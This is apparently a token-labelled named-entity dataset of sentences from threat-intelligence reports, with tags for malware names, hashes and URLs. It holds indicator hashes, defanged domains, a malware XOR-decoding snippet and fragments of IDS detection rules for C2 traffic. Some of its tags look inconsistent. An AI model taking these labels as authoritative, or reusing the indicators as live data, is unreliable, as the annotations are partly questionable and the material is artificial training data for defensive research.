C++	O

flame	O
malware	O
windows	O
matousec	O
microsoft	O
microsoft	O
windows	O
mobile	O
network	O
news	O

Word	O
document	O
contained	O
in	O
EXE	O
file	O
926235FCF7B91442A405B5760A0729EB	B-hash

Targeted	O
attacks	O
discovered	O
by	O
industry	O

Agent.RUI	O
Win32/TrojanDropper	O
.	O

Figure	O
7	O
-	O
Simple	O
Sandbox	O
Detection	O
Check	O
via	O
Mouse	O
Movement	O
The	O
RAT	B-malware.backdoor
Installer	O
contains	O
an	O
obfuscated	O
malicious	O
DLL	O
payload	O
,	O
which	O
it	O
rebuilds	O
and	O
installs	O
.	O

It	O
's	O
a	O
.NET	O
wrapper	O
for	O
the	O
Windows	O
Task	O
Scheduler	O
The	O
second	O
is	O
the	O
G2	O
version	O
of	O
GravityRAT	B-malware.drop
This	O
variant	O
shares	O
the	O
same	O
command	O
and	O
control	O
(	O
C2	O
)	O
servers	O
as	O
G1	O
,	O
however	O
,	O
we	O
have	O
an	O
additional	O
'	O
payload	O
'	O
variable	O
added	O
to	O
G2	O
.	O

The	O
following	O
factors	O
reveal	O
the	O
attackers	O
intention	O
to	O
remain	O
stealthy	O
and	O
to	O
gain	O
long-term	O
access	O
by	O
evading	O
analysis	O
and	O
security	O
monitoring	O
at	O
both	O
the	O
desktop	O
and	O
network	O
levels	O
.	O

Until	O
it	O
checks	O
in	O
with	O
its	O
C2	O
controller	O
,	O
the	O
RAT	B-malware.backdoor
server	O
searches	O
for	O
the	O
encrypted	O
confi	O
guration	O
buffer	O
containing	O
the	O
C	O
&	O
Cs	O
that	O
will	O
get	O
decrypted	O
using	O
an	O
AES	O
key	O
derived	O
from	O
a	O
hardcoded	O
string	O
'	O
Mother360	O
'	O
.	O

Network	O
Segmentation	O
and	O
Segregation	O
into	O
Security	O
Zones	O
–	O
Segment	O
networks	O
into	O
logical	O
enclaves	O
and	O
restrict	O
host-to-host	O
communications	O
paths	O
.	O

That	O
's	O
why	O
so	O
many	O
systems	O
in	O
Ukraine	O
were	O
affected	O
by	O
this	O
attack	O
.	O

•	O
Java/1.8.0_25	O
•	O
Java/1.8.0_26	O
•	O
Mozilla/5.0	O
(	O
Windows	O
NT	O
6.1	O
;	O
WOW64	O
;	O
Trident/7.0	O
;	O
iTunes/12.0.1	O
(	O
Windows	O
;	O
N	O
)	O
rv:11.0	O
)	O
like	O
Gecko	O
•	O
Mozilla/5.0	O
(	O
Windows	O
NT	O
6.1	O
;	O
WOW64	O
;	O
rv:32.0	O
)	O
Gecko/20100101	O
Firefox/32.0	O
•	O
Mozilla/5.0	O
(	O
Windows	O
NT	O
6.1	O
;	O
WOW64	O
)	O
AppleWebKit/537.36	O
(	O
KHTML	O
,	O
like	O
Gecko	O
)	O
Chrome	O
/34.0.1847.137	O
Safari/537.36	O

key	O
=	O
0x1D	O
#	O
Keys	O
may	O
vary	O
depending	O
on	O
the	O
sample	O
for	O
i	O
in	O
range	O
(	O
0	O
,	O
length	O
)	O
:	O
buf	O
[	O
i	O
]	O
=	O
chr	O
(	O
ord	O
(	O
buf	O
[	O
i	O
]	O
)	O
^	O
key	O
)	O
key	O
+=	O
0x5D	O
key	O
&	O
=0xff	O

The	O
unique	O
username	O
moayy2ad	O
enabled	O
us	O
to	O
find	O
plenty	O
of	O
information	O
on	O
the	O
attacker	O
.	O

The	O
design	O
of	O
the	O
hack	O
bears	O
striking	O
similarity	O
to	O
the	O
very	O
exploits	O
that	O
have	O
made	O
Sofacy	B-malware.backdoor
so	O
feared	O
and	O
respected	O
.	O

Given	O
that	O
we	O
know	O
when	O
information	O
about	O
these	O
APT	B-malware.unknown
campaigns	O
was	O
made	O
public	O
,	O
we	O
can	O
compute	O
the	O
number	O
of	O
days	O
it	O
took	O
the	O
security	O
community	O
to	O
publicly	O
tie	O
the	O
samples	O
to	O
an	O
APT	B-malware.unknown
campaign	O
,	O
even	O
though	O
the	O
samples	O
had	O
been	O
marked	O
malicious	O
for	O
other	O
reasons	O
.	O

The	O
development	O
of	O
the	O
X-Agent	B-malware.infosteal
Android	O
malware	O
represents	O
an	O
expansion	O
of	O
FANCY	O
BEAR	O
capabilities	O
in	O
terms	O
of	O
mobile	O
malware	O
,	O
and	O
illustrates	O
the	O
practical	O
application	O
of	O
full-spectrum	O
combat	O
as	O
envisioned	O
in	O
the	O
eponymous	O
doctrinal	O
writings	O
of	O
General	O
Valery	O
GERASIMOV	O
.	O

The	O
task	O
name	O
disguise	O
helps	O
keep	O
a	O
low	O
profi	O
le	O
and	O
evade	O
scrutiny	O
in	O
case	O
of	O
an	O
investigation	O
:	O

Does	O
Kaspersky	O
Lab	O
detect	O
all	O
variants	O
of	O
this	O
malware	O
?	O

And	O
later	O
2016	O
,	O
their	O
focus	O
turned	O
towards	O
the	O
Olympics	O
'	O
and	O
the	O
World	O
Anti-Doping	O
Agency	O
(	O
WADA	O
)	O
and	O
Court	O
of	O
Arbitration	O
for	O
Sports	O
(	O
CAS	O
)	O
,	O
when	O
individuals	O
and	O
servers	O
in	O
these	O
organizations	O
were	O
phished	O
and	O
compromised	O
.	O

Although	O
we	O
did	O
not	O
notice	O
the	O
correlation	O
immediately	O
,	O
there	O
is	O
good	O
overlap	O
between	O
the	O
groups	O
we	O
've	O
described	O
above	O
,	O
and	O
the	O
clusters	O
of	O
activity	O
described	O
as	O
sharing	O
a	O
Flash	O
0-day	O
in	O
early	O
2014	O
by	O
Symantec	O
.	O

The	O
domain	O
news.grouptumbler.com	O
is	O
currently	O
resolving	O
to	O
173.194.70.101	O

The	O
victim	O
has	O
been	O
under	O
constant	O
attack	O
acted	O
by	O
APT-C-06	O
since	O
2015	O
.	O

ASCII	O
to	O
Integer	O
Conversion	O

Meltdown	O
and	O
Spectre	O
:	O
Yes	O
,	O
your	O
device	O
is	O
likely	O
vulnerable	O

tomhanks542@gmail[.]com	O
.	O

It	O
is	O
unclear	O
whether	O
these	O
were	O
leased	O
or	O
hijacked	O
,	O
but	O
the	O
fact	O
that	O
many	O
of	O
them	O
appear	O
to	O
follow	O
a	O
pattern—with	O
the	O
latter	O
three	O
numbers	O
of	O
each	O
address	O
often	O
running	O
in	O
sequence—makes	O
it	O
likely	O
they	O
were	O
deliberately	O
selected	O
by	O
the	O
attackers	O
.	O

It	O
then	O
uses	O
register	O
EBX	O
to	O
do	O
some	O
rather	O
'	O
inefficient	O
'	O
operations	O
.	O

The	O
first	O
piece	O
of	O
new	O
functionality	O
is	O
that	O
the	O
attackers	O
build	O
a	O
possible	O
list	O
of	O
drive	O
names	O
(	O
A-Z	O
)	O
and	O
scan	O
for	O
the	O
existence	O
of	O
each	O
drive	O
:	O

Some	O
of	O
the	O
more	O
recent	O
revoked	O
certificates	O
include	O
ones	O
that	O
belong	O
to	O
Xuchang	O
Hongguang	O
Technology	O
Co	O
.	O

Given	O
the	O
inherent	O
nature	O
of	O
threat	O
intelligence	O
,	O
the	O
content	O
contained	O
in	O
this	O
alert	O
is	O
based	O
on	O
information	O
gathered	O
and	O
understood	O
at	O
the	O
time	O
of	O
its	O
creation	O
.	O

Use	O
of	O
the	O
Framework	O
is	O
strictly	O
voluntary	O
.	O

Note	O
that	O
both	O
the	O
subjects	O
,	O
'	O
Transfer	O
investigation	O
report	O
'	O
and	O
'	O
Confirm	O
transactions	O
before	O
release	O
'	O
are	O
comparatively	O
unique	O
as	O
are	O
the	O
senders	O
,	O
'	O
Police	O
Department	O
'	O
cmmds@sbt.co[.]in	O
and	O
Arthur	O
Anderson	O
alexanderharolds@arthurandersen[.]com	O
.	O

2016	O
.	O

'	O
Referer	O
:	O
'	O
;	O
http_header	O
;	O
reference	O
:	O
md5,4dd319a230ee3a0735a656231b4c9063	O
;	O
classtype	O
:	O
trojan­activity	O
;	O
metadata	O
:	O
tlp	O
WHITE	O
,	O
author	O
@	O
ipsosCustodes	O
;	O
sid:99999901	O
;	O
rev:2015200401	O
;	O
)	O
alert	O
http	O
any	O
any	O
­	O
>	O
any	O
any	O
(	O
msg	O
:	O
'	O
­­	O
[	O
PwC	O
CTD	O
]	O
­­	O
Unclassified	O
Middle	O
Eastern	O
Actor	O
­	O
DownExecute	B-malware.infosteal
URI	O
(	O
/dw/setup	O
)	O
'	O
;	O
flow	O
:	O
established	O
,	O
to_server	O
;	O
urilen	O
:	O
>	O
8	O
;	O
content	O
:	O
'	O
/dw/setup	O
'	O
;	O
http_uri	O
;	O
depth:9	O
;	O
content	O
:	O
'	O
POST	O
'	O
;	O
http_method	O
;	O
reference	O
:	O
md5,4dd319a230ee3a0735a656231b4c9063	O
;	O
classtype	O
:	O
trojan­activity	O
;	O
metadata	O
:	O
tlp	O
WHITE	O
,	O
author	O
@	O
ipsosCustodes	O
;	O
sid:99999902	O
;	O
rev:2015200401	O
;	O
)	O
alert	O
http	O
any	O
any	O
­	O
>	O
any	O
any	O
(	O
msg	O
:	O
'	O
­­	O
[	O
PwC	O
CTD	O
]	O
­­	O
Unclassified	O
Middle	O
Eastern	O
Actor	O
­	O
DownExecute	B-malware.infosteal
Headers	O
'	O
;	O
flow	O
:	O
established	O
,	O
to_server	O
;	O
urilen	O
:	O
>	O
7	O
;	O
content	O
:	O
'	O
Accept	O
*/*	O
'	O
;	O
http_client_body	O
;	O
content	O
:	O
'	O
Content­Type	O
:	O
multipart/form­data\	O
;	O
boundary=­­­­­­­­­­­­­­­­­­­­­­­­	O
'	O
;	O
http_header	O
;	O
content	O
:	O
'	O
ci_session=	O
'	O
;	O
http_cookie	O
;	O
depth:11	O
;	O
content	O
:	O
'	O
POST	O
'	O
;	O
http_method	O
;	O
content	O
:	O
!	O

Artefact	O
type	O

These	O
and	O
other	O
samples	O
are	O
listed	O
below	O
:	O
#	O
MD5	O
Submitted	O
From	O

takeOutPacket	O
:	O
:	O
:	O
]	O

Hiding	O
infrastructure	O
in	O
plain	O
sight	O

Initial	O
message	O
to	O
the	O
command	O
and	O
control	O
server	O
The	O
response	O
from	O
the	O
C	O
&	O
C	O
is	O
enclosed	O
with	O
the	O
tag	O
<	O
CHECK	O
>	O
<	O
/CHECK	O
>	O
.	O

The	O
email	O
contains	O
the	O
first	O
link	O
in	O
the	O
chain	O
,	O
a	O
word	O
document	O
,	O
containing	O
an	O
OLE	O
binary	O
object	O
.	O

Figure	O
17	O
:	O
Persistence	O
Key	O

715f54a077802a0d67e6e7136bcbe340	B-hash
ABRIL	O
CmetaS3	O

Library	O
Characters	O
Offsets	O

The	O
AES	O
key	O
structure	O
is	O
highly	O
predictable	O
,	O
as	O
the	O
quantum	O
for	O
updating	O
the	O
system	O
clock	O
(	O
HKLM\SYSTEM\CurrentControlSet\Services\W32Time\Config\LastClockRate	O
)	O
is	O
set	O
to	O
0x2625A	O
hundred-nanoseconds	O
by	O
default	O
,	O
and	O
the	O
clock	O
readings	O
that	O
comprise	O
the	O
key	O
and	O
IV	O
are	O
taken	O
in	O
a	O
tight	O
loop	O
:	O
0x406EA4	O
:	O
8D45C0	O
LEA	O
EAX	O
,	O
[	O
EBP-0x40	O
]	O
0x406EA7	O
:	O
50	O
PUSH	O
EAX	O

>	O
48,000	O
DDoS	O
>	O
8	O
months	O
Sophistication	O
Impact	O
#	O
of	O
Infections	O
Losses	O
Time	O
Before	O
Detection	O

At	O
the	O
time	O
of	O
research	O
,	O
there	O
were	O
around	O
60	O
victims	O
whose	O
data	O
were	O
uploaded	O
to	O
Confucius-owned	O
cloud	O
storage	O
account	O
.	O

OriginalFilename	O
:	O
cdto.dll	O
ProductName	O
:	O
Microsoft	O
Corporation	O
.	O

But	O
there	O
are	O
detractors	O
.	O

Files	O
in	O
this	O
directory	O
were	O
found	O
to	O
be	O
screenshots	O
,	O
keylogger	O
data	O
,	O
audio	O
from	O
Skype	O
calls	O
,	O
passwords	O
and	O
more	O
.	O

The	O
kill	O
chain	O
starts	O
with	O
an	O
email	O
containing	O
an	O
HTML	O
attachment	O
with	O
a	O
refresh	O
tag	O
that	O
uses	O
a	O
Google	O
URL	O
shortener	O
as	O
the	O
target	O
.	O

The	O
downloader	O
has	O
low	O
detection	O
rates	O
(	O
detected	O
by	O
only	O
4	O
out	O
of	O
54	O
AV	O
products	O
)	O
.	O

Command	O
and	O
control	O
(	O
C2	O
)	O
domains	O
used	O
by	O
StoneDrill	B-malware.backdoor
and	O
NewsBeef	B-malware.infosteal
in	O
Kaspersky	O
's	O
findings	O
were	O
found	O
to	O
share	O
an	O
SSL	O
certificate	O
,	O
which	O
surfaced	O
an	O
additional	O
three	O
domains	O
in	O
research	O
by	O
the	O
Iran	O
Cyber	O
News	O
Agency	O
.	O

In	O
order	O
to	O
identify	O
their	O
presence	O
,	O
not	O
only	O
can	O
you	O
gain	O
valuable	O
insight	O
into	O
their	O
targeting	O
from	O
intelligence	O
reports	O
and	O
gain	O
powerful	O
means	O
of	O
detections	O
with	O
hunting	O
tools	O
like	O
YARA	O
,	O
but	O
out-of-band	O
processing	O
with	O
a	O
solution	O
like	O
KATA	O
is	O
important	O
.	O

SUBMITTER	O
CAMPAIGNS	O

This	O
impersonating	O
domain	O
was	O
also	O
registered	O
on	O
the	O
same	O
day	O
20th	O
February	O
2017	O
and	O
this	O
domain	O
could	O
also	O
be	O
used	O
by	O
the	O
attackers	O
to	O
send	O
out	O
spear-phishing	O
emails	O
to	O
different	O
targets	O
.	O

This	O
IP	O
address	O
is	O
associated	O
with	O
hosting	O
provider	O
in	O
Indonesia	O
as	O
shown	O
in	O
the	O
screen	O
shots	O
below	O
Below	O
screen	O
shot	O
shows	O
the	O
timeline	O
when	O
the	O
IP	O
address	O
was	O
active	O
.	O

In	O
other	O
cases	O
,	O
the	O
document	O
includes	O
instructions	O
motivating	O
the	O
victim	O
to	O
enable	O
macro	O
code	O
execution	O
.	O

Figure	O
12	O
:	O
Cobalt	O
Strike	O
BEACON	O
C2	O
The	O
following	O
FireEye	O
products	O
currently	O
detect	O
and	O
block	O
the	O
methods	O
described	O
above	O
.	O

ESET	O
researchers	O
found	O
evidence	O
that	O
supports	O
this	O
theory	O
.	O

Australia	O
,	O
Bahrain	O
,	O
Bangladesh	O
,	O
Brunei	O
,	O
Canada	O
,	O
Czech	O
Republic	O
,	O
Estonia	O
,	O
Ethiopia	O
,	O
Germany	O
,	O
India	O
,	O
Indonesia	O
,	O
Japan	O
,	O
Latvia	O
,	O
Malaysia	O
,	O
Mexico	O
,	O
Mongolia	O
,	O
Netherlands	O
,	O
Qatar	O
,	O
Serbia	O
,	O
Singapore	O
,	O
Turkmenistan	O
,	O
United	O
Arab	O
Emirates	O
,	O
United	O
Kingdom	O
,	O
United	O
States	O
,	O
Vietnam	O
.	O

Ch	O
3.20	O
:	O
7872c1d88fe21d8a85f160a6666c76e8	B-hash
Ch	O
3.25	O
:	O
ec7e3cfaeaac0401316d66e964be684e	B-hash
Code	O
similarity	O
:	O
91	O
%	O
In	O
the	O
3.25	O
version	O
,	O
the	O
author	O
switched	O
to	O
the	O
CLSID	O
:	O
42aedc87-2188-41fd-b9a3-0c966feabec1	O
as	O
described	O
in	O
our	O
article	O
.	O

Figure	O
3	O
:	O
XLSX	O
Macro	O
Figure	O
4	O
contains	O
the	O
decoded	O
output	O
of	O
the	O
encoded	O
text	O
.	O

Third	O
,	O
we	O
show	O
the	O
results	O
from	O
the	O
AMP	O
dataset	O
.	O

Westdeutscher	O
Rundfunk	O
.	O

The	O
core	O
of	O
the	O
CozyDuke	B-malware.drop
toolset	O
is	O
a	O
modular	O
attack	O
platform	O
consisting	O
of	O
a	O
main	O
component	O
augmented	O
by	O
a	O
set	O
of	O
additional	O
modules	O
implementing	O
further	O
functionality	O
.	O

When	O
we	O
tracked	O
ChessMaster	O
back	O
in	O
November	O
,	O
we	O
noted	O
that	O
it	O
exploited	O
the	O
SOAP	O
WSDL	O
parser	O
vulnerability	O
CVE-2017-8759	O
(	O
patched	O
in	O
September	O
2017	O
)	O
within	O
the	O
Microsoft	O
.NET	O
framework	O
to	O
download	O
additional	O
malware	O
.	O

In	O
this	O
case	O
,	O
however	O
,	O
instead	O
of	O
dropping	O
CozyDuke	B-malware.drop
,	O
the	O
executables	O
may	O
drop	O
other	O
executables	O
,	O
scripts	O
or	O
DLLs	O
.	O

All	O
of	O
these	O
functions	O
are	O
named	O
similarly	O
to	O
Siemens	O
S7ProSim	O
v5.4	O
COM	O
interface	O
.	O

It	O
is	O
possible	O
the	O
authors	O
of	O
CozyDuke	B-malware.drop
were	O
trying	O
out	O
a	O
new	O
design	O
,	O
but	O
eventually	O
decided	O
to	O
go	O
back	O
to	O
the	O
original	O
.	O

ASCII	O
strings	O
within	O
the	O
configuration	O
data	O
reveal	O
a	O
lot	O
about	O
Babar	O
's	O
intentions	O
:	O
Office	O
executable	O
names	O
and	O
associated	O
document	O
abbreviations	O

Monitor	O
ICS	O
network	O
traffic	O
for	O
unexpected	O
communication	O
flows	O
and	O
other	O
anomalous	O
activity	O
.	O

Function	O
FormCryptoKey_sub_49D2F4	O
(	O
)	O

This	O
determination	O
expands	O
upon	O
the	O
Joint	O
Statement	O
released	O
October	O
7	O
,	O
2016	O
,	O
from	O
the	O
Department	O
of	O
Homeland	O
Security	O
and	O
the	O
Director	O
of	O
National	O
Intelligence	O
on	O
Election	O
Security	O
.	O

Directory	O
listing	O
,	O
poisoned	O
StrongPity	O
installers	O
,	O
at	O
rarlrab[.]com	B-url.normal

تارباخم	O
عامتجا	O
رضحم	O
رورم	O
تاملك	O
رس	O
تاملك	O
رورملا	O
تاملك	O
رسلا	O
تاملك	O
رسلا	O
تاملك	O
تانايب	O
ةدعاق	O
ةقيثو	O
ةيتاذ	O
ةريس	O
اتيس	O
يركسع	O
ينمأ	O
تلايميلإا	O
تارابختسا	O

Lastly	O
,	O
during	O
the	O
investigation	O
,	O
Cybereason	O
noticed	O
that	O
some	O
of	O
the	O
C	O
&	O
C	O
domains	O
and	O
IPs	O
started	O
to	O
emerge	O
on	O
VirusTotal	B-url.normal
and	O
other	O
threat	O
intelligence	O
engines	O
,	O
with	O
payloads	O
that	O
were	O
not	O
observed	O
during	O
Cobalt	O
Kitty	O
.	O

We	O
discovered	O
over	O
400	O
previously	O
unreported	O
SSH	O
sessions	O
between	O
CSRI	O
ranges	O
and	O
Spanish	O
government	O
and	O
university	O
networks	O
from	O
April	O
4	O
,	O
2018	O
to	O
April	O
9	O
,	O
2018	O
.	O

Sunday	O
,	O
May	O
04	O
,	O
2014	O
The	O
greatest	O
education	O
in	O
the	O
world	O
is	O
watching	O
the	O
masters	O
at	O
work	O
.	O

export	O
function	O
.	O

[	O
OP	O
PL	O
]	O
.	O

As	O
mentioned	O
previously	O
,	O
IRONGATE	B-malware.backdoor
seeks	O
to	O
manipulate	O
code	O
similar	O
to	O
that	O
found	O
on	O
a	O
blog	O
dealing	O
with	O
simulating	O
PLC	O
communications	O
using	O
PLCSIM	O
,	O
including	O
the	O
use	O
of	O
an	O
executable	O
named	O
biogas.exe	O
.	O

A	O
previous	O
campaign	O
of	O
this	O
APT	O
group	O
was	O
uncovered	O
by	O
Talos	O
in	O
June	O
2017	O
,	O
and	O
since	O
then	O
very	O
little	O
of	O
this	O
operation	O
was	O
seen	O
in	O
the	O
wild	O
.	O

The	O
binary	O
is	O
indeed	O
statically	O
linked	O
with	O
OpenSSL	O
library	O
,	O
such	O
that	O
it	O
really	O
does	O
look	O
like	O
an	O
SSH	O
tool	O
.	O

Once	O
the	O
attacks	O
are	O
completed	O
the	O
DarkComet	B-malware.backdoor
bot	O
will	O
respond	O
with	O
an	O
encrypted	O
status	O
message	O
such	O
as	O
the	O
following	O
:	O

However	O
,	O
the	O
choice	O
of	O
bank	O
supervisor	O
/	O
state-bank	O
websites	O
would	O
be	O
apt	O
,	O
given	O
their	O
previous	O
targeting	O
of	O
Central	O
Banks	O
for	O
Heists	O
–	O
even	O
when	O
it	O
serves	O
little	O
operational	O
benefit	O
for	O
infiltrating	O
the	O
wider	O
banking	O
sector	O
.	O

This	O
makes	O
the	O
RAT	B-malware.backdoor
unstable	O
as	O
multiple	O
instances	O
may	O
be	O
executed	O
simultaneously	O
on	O
the	O
same	O
host	O
machine	O
causing	O
unexpected	O
behavior	O
.	O

We	O
can	O
see	O
that	O
the	O
authors	O
adapted	O
features	O
to	O
the	O
Windows	O
versions	O
,	O
patched	O
bugs	O
,	O
added	O
obfuscation	O
etc	O
...	O
The	O
biggest	O
update	O
was	O
performed	O
to	O
version	O
3.00	O
,	O
after	O
two	O
years	O
of	O
silence	O
.	O

The	O
malware	O
then	O
walks	O
the	O
list	O
of	O
processes	O
and	O
modules	O
looking	O
for	O
installed	O
AV	O
software	O
.	O

19968	O
19840	O
26616	O

In	O
all	O
examples	O
of	O
ScanBox	B-malware.infosteal
deployments	O
discussed	O
so	O
far	O
,	O
we	O
believe	O
that	O
the	O
scripts	O
were	O
deployed	O
to	O
anyone	O
who	O
visited	O
websites	O
of	O
interest	O
to	O
a	O
given	O
sector	O
which	O
the	O
attacker	O
was	O
able	O
to	O
compromise–	O
and	O
that	O
the	O
attackers	O
waited	O
for	O
victims	O
to	O
visit	O
the	O
compromised	O
site	O
.	O

Figure	O
1	O
-	O
Extracted	O
files	O

Finally	O
,	O
it	O
marks	O
ZxShell	B-malware.backdoor
main	O
Dll	O
for	O
deletion	O
with	O
the	O
MoveFileEx	O

Web	O
.	O

In-depth	O
investigation	O
of	O
the	O
attack	O
reveal	O
that	O
preparation	O
went	O
back	O
as	O
early	O
as	O
September	O
2010	O
before	O
finally	O
culminating	O
in	O
the	O
compromise	O
of	O
the	O
user	O
databases	O
between	O
July	O
26-28	O
,	O
2011	O
.	O

Hash	O
Downloader	O
used	O
in	O
the	O
campaign	O
:	O

June	O
9	O
,	O
2016	O
The	O
memory	O
cleaner	O
function	O
generates	O
random	O
bytes	O
and	O
fills	O
the	O
memory	O
area	O
.	O

Our	O
analysis	O
finds	O
that	O
IRONGATE	B-malware.backdoor
invokes	O
ICS	O
attack	O
concepts	O
first	O
seen	O
in	O
Stuxnet	O
,	O
but	O
in	O
a	O
simulation	O
environment	O
.	O

The	O
HTML	O
source	O
of	O
this	O
page	O
is	O
displayed	O
in	O
the	O
following	O
image	O
.	O

Full	O
File	O
Path	O
:	O
SHA256	O
:	O
File	O
Size	O
:	O
Compile	O
Time	O
:	O

While	O
the	O
Double	O
XOR	O
is	O
a	O
trivial	O
technique	O
,	O
it	O
is	O
the	O
sum	O
of	O
the	O
routines	O
and	O
keys	O
used	O
in	O
malware	O
that	O
can	O
end	O
up	O
leading	O
to	O
attribution	O
.	O

Figure	O
1	O
:	O
Example	O
APT32	B-malware.infosteal
Phishing	O
Lure	O
–	O
Fake	O
Gmail	O
Error	O
Message	O
Figure	O
2	O
:	O
Example	O
APT32	B-malware.infosteal
Phishing	O
Lure	O
–	O
Fake	O
Text	O
Encoding	O
Error	O
Message	O
APT32	B-malware.infosteal
operators	O
implemented	O
several	O
novel	O
techniques	O
to	O
track	O
the	O
efficacy	O
of	O
their	O
phishing	O
,	O
monitor	O
the	O
distribution	O
of	O
their	O
malicious	O
documents	O
,	O
and	O
establish	O
persistence	O
mechanisms	O
to	O
dynamically	O
update	O
backdoors	O
injected	O
into	O
memory	O
.	O

Description	O

In	O
each	O
of	O
the	O
attacks	O
the	O
infection	O
method	O
was	O
almost	O
identical	O
and	O
included	O
an	O
extraordinary	O
number	O
of	O
stages	O
used	O
to	O
avoid	O
detection	O
.	O

APT12	O
's	O
adaptations	O
to	O
public	O
disclosures	O
lead	O
FireEye	O
to	O
make	O
several	O
conclusions	O
about	O
this	O
threat	O
group	O
:	O
APT12	O
closely	O
monitors	O
online	O
media	O
related	O
to	O
its	O
tools	O
and	O
operations	O
and	O
reacts	O
when	O
its	O
tools	O
are	O
publicly	O
disclosed	O
.	O

It	O
is	O
widely	O
believed	O
that	O
Iran	O
's	O
Natanz	O
nuclear	O
Fuel	O
Enrichment	O
Plant	O
(	O
FEP	O
)	O
was	O
the	O
intended	O
target	O
.	O

After	O
achieving	O
persistence	O
and	O
dropping	O
the	O
executable	O
,	O
the	O
legitimate	O
Symantec	O
executable	O
,	O

Each	O
encrypted	O
directory	O
will	O
have	O
a	O
ransom	O
note	O
left	O
in	O
it	O
:	O

Our	O
analysis	O
begins	O
with	O
the	O
exploit	O
document	O
named	O
'	O
Draft	O
PH-US	O
Dialogue	O
on	O
Cyber	O
Security.doc	O
'	O
that	O
takes	O
advantage	O
of	O
the	O
CVE-2017-11882	O
vulnerability	O
.	O

90e11bdbc380c88244bb0152f1142aff	B-hash

다양한	O
종류의	O
악성코드	O
가	O
사용되었으며	O
,	O
nc.exe	B-malware.drop
,	O
nt.exe	B-malware.drop
,	O
n5lic.exe	B-malware.drop
,	O
nc5rt2.exe	B-malware.drop
,	O
Bin.exe	B-malware.drop
등이	O
있다	O
.	O

This	O
campaign	O
leveraged	O
four	O
different	O
lures	O
and	O
targeted	O
Korean-speaking	O
users	O
of	O
the	O
Hangul	O
Word	O
Processor	O
(	O
.hwp	O
file	O
extension	O
)	O
,	O
a	O
Korean-language	O
word	O
processing	O
program	O
utilized	O
widely	O
in	O
South	O
Korea	O
.	O

It	O
is	O
important	O
to	O
note	O
that	O
,	O
all	O
the	O
Sandboxes	O
we	O
know	O
are	O
disabling	O
to	O
fight	O
against	O
this	O
kind	O
of	O
attack	O
.	O

Figure	O
6	O
:	O
APT32	B-malware.infosteal
Attack	O
Lifecycle	O
Based	O
on	O
incident	O
response	O
investigations	O
,	O
product	O
detections	O
,	O
and	O
intelligence	O
observations	O
along	O
with	O
additional	O
publications	O
on	O
the	O
same	O
operators	O
,	O
FireEye	O
assesses	O
that	O
APT32	O
is	O
a	O
cyber	O
espionage	O
group	O
aligned	O
with	O
Vietnamese	O
government	O
interests	O
.	O

These	O
variants	O
require	O
a	O
loader	O
component	O
to	O
load	O
them	O
into	O
memory	O
in	O
order	O
to	O
be	O
executed	O
.	O

All	O
rights	O
reserved	O
.	O

The	O
HTTP	O
traffic	O
generated	O
by	O
both	O
samples	O
uses	O
a	O
limited	O
number	O
of	O
header	O
fields	O
,	O
which	O
is	O
substantially	O
different	O
from	O
the	O
majority	O
of	O
traffic	O
generated	O
by	O
modern	O
browsers	O
.	O

Intelligence	O
Report	O
Israel	O
's	O
strategic	O
position	O
has	O
improved.exe	O

The	O
first	O
stage	O
payload	O
(	O
example	O
:	O

This	O
payload	O
then	O
creates	O
a	O
DLL	O
file	O
in	O
system32	O
called	O
CREDRIVER.dll	O
,	O
which	O
is	O
in	O
fact	O
the	O
actual	O
backdoor	O
:	O

i=	O

또한	O
공격	O
대상	O
(	O
target	O
)	O
이	O
사용하는	O
소프트웨어의	O
취약점을	O
이용	O
한	O
공격이	O
빈번한	O
점	O
등으로	O
미루어	O
한국의	O
IT	O
환경에	O
대해	O
상당히	O
파악하고	O
있는	O
것으로	O
보인다	O
.	O

The	O
networks	O
abused	O
were	O
designed	O
for	O
internet	O
communications	O
with	O
ships	O
at	O
sea	O
which	O
span	O
a	O
greater	O
geographical	O
area	O
at	O
nearly	O
global	O
scale	O
,	O
while	O
providing	O
nearly	O
no	O
security	O
for	O
their	O
downlinks	O
.	O

This	O
attack	O
vector	O
will	O
likely	O
use	O
a	O
well-crafted	O
email	O
containing	O
either	O
a	O
malicious	O
file	O
or	O
web	O
hyperlink	O
to	O
what	O
recipients	O
believe	O
is	O
the	O
actual	O
website	O
;	O
but	O
is	O
instead	O
a	O
fake	O
landing	O
page	O
.	O

,	O
Upload	O
&	O
Execute	O
additional	O
malware	O
,	O
Capture	O
Webcam	O
,	O
Remote	O
Desktop	O
,	O
File	O
Manager	O
,	O
Browser	O
Password	O
Recovery	O
,	O
Capture	O
Microphone	O
,	O
Keylogger	O
,	O
etc	O
.	O

What	O
links	O
Babar64	B-malware.drop
to	O
other	O
families	O
analyzed	O
beforehand	O
,	O
such	O
as	O
Bunny	B-malware.unknown
or	O
TFC	O
(	O
also	O
called	O
NBOT	B-malware.unknown
)	O
are	O
shared	O
portions	O
of	O
source	O
code	O
and	O
re-used	O
coding	O
techniques	O
.	O

PUSH/JMP	O
technique	O

This	O
technique	O
may	O
very	O
likely	O
be	O
deployed	O
in	O
the	O
political	O
,	O
government	O
,	O
or	O
non-governmental	O
sectors	O
in	O
the	O
near	O
future	O
.	O

13	O
Dec	O
.	O

'	O
Russia	O
State-Sponsored	O
Doping	O
Across	O
Majority	O
of	O
Olympic	O
Sports	O
,	O
Claims	O
Report	O
.	O
'	O

Injected	O
link	O
with	O
the	O
file	O
scheme	O
Injected	O
link	O
with	O
the	O
file	O
scheme	O

We	O
analyzed	O
a	O
recently	O
acquired	O
malware	O
sample	O
and	O
identified	O
it	O
as	O
FinSpy	B-malware.backdoor
.	O

Serial	O
number	O
Figure	O
12	O
.	O

Enforce	O
a	O
strict	O
lockout	O
policy	O
for	O
network	O
users	O
and	O
closely	O
monitor	O
logs	O
for	O
failed	O
login	O
activity	O
.	O

Current	O
SPLM	B-malware.backdoor
code	O
maintains	O
the	O
unusual	O
cipher	O
hack	O
that	O
Sofacy	O
began	O
deploying	O
in	O
2017	O
to	O
hide	O
away	O
configuration	O
details	O
.	O

BEYOND	O
BABAR	B-malware.drop
.............................................................................................	I-malware.drop
16	I-malware.drop
5	O
.	O

However	O
,	O
in	O
this	O
attack	O
,	O
this	O
file	O
is	O
used	O
to	O
load	O
the	O
Hussarini	B-malware.backdoor
backdoor	O
via	O
DLL	B-malware.backdoor
hijacking	O
.	O

Although	O
a	O
regional	O
actor	O
,	O
the	O
group	O
has	O
followed	O
two	O
trends	O
seen	O
globally	O
among	O
targeted	O
attack	O
groups	O
.	O

Both	O
adversaries	O
engage	O
in	O
extensive	O
political	O
and	O
economic	O
espionage	O
for	O
the	O
benefit	O
of	O
the	O
government	O
